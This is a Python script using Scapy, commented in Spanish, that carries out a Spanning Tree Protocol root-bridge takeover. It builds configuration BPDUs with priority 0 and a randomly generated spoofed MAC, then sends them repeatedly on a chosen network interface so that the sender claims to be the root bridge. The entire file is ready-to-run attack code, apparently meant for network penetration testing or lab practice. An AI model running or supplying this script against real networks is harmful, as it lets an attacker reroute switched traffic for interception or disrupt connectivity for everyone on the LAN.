#!/usr/bin/env python3
"""
STP Root Claim - Funcional
Se convierte en root bridge enviando BPDUs superiores
"""

from scapy.all import *
import argparse
import time
import os  # Corrección: Importación necesaria para verificar privilegios root

def create_bpdu(priority, attacker_mac):
    """Crea BPDU de configuración STP usando la estructura nativa de Scapy"""
    # Ethernet multicast estándar para STP: 01:80:C2:00:00:00
    eth = Ether(dst="01:80:c2:00:00:00", src=attacker_mac)
    
    # Capa LLC (Logical Link Control) indispensable para STP
    llc = LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
    
    # Capa STP: Al poner los mismos datos en root y bridge, nos proclamamos Root
    bpdu = STP(
        proto=0,
        version=0,
        bpdutype=0,
        bpduflags=0,
        prio=priority,
        rootmac=attacker_mac,
        pathcost=0,
        bridgeprio=priority,
        bridgemac=attacker_mac,
        portid=0x8001,
        age=0,
        maxage=20,
        hellotime=2,
        fwddelay=15
    )
    
    return eth / llc / bpdu

def stp_root_claim(interface, priority, duration):
    """Envía BPDUs para convertirse en root"""
    attacker_mac = str(RandMAC())  # Genera una MAC aleatoria fija para esta sesión
    
    print(f"[*] Iniciando STP Root Claim...")
    print(f"[*] MAC atacante simulada: {attacker_mac}")
    print(f"[*] Prioridad elegida: {priority}")
    print(f"[*] Enviando BPDUs cada 2 segundos por la interfaz {interface} durante {duration}s...")
    
    start = time.time()
    count = 0
    
    try:
        while time.time() - start < duration:
            bpdu = create_bpdu(priority, attacker_mac)
            sendp(bpdu, iface=interface, verbose=0)
            count += 1
            
            print(f"\r[+] BPDUs enviados: {count}", end="")
            time.sleep(2)  # El Hello Time estándar de STP es de 2 segundos
        
        print(f"\n[+] STP Root Claim completado: {count} BPDUs enviados")
        
    except KeyboardInterrupt:
        print(f"\n[!] Detenido por el usuario. BPDUs enviados: {count}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="STP Root Claim")
    parser.add_argument("-i", "--interface", required=True, help="Interfaz de red")
    parser.add_argument("-p", "--priority", type=int, default=0, help="Prioridad del bridge (0-61440)")
    parser.add_argument("-t", "--time", type=int, default=60, help="Duración en segundos")
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("[!] Error: Este script requiere privilegios de root (sudo).")
        exit(1)
    
    stp_root_claim(args.interface, args.priority, args.time)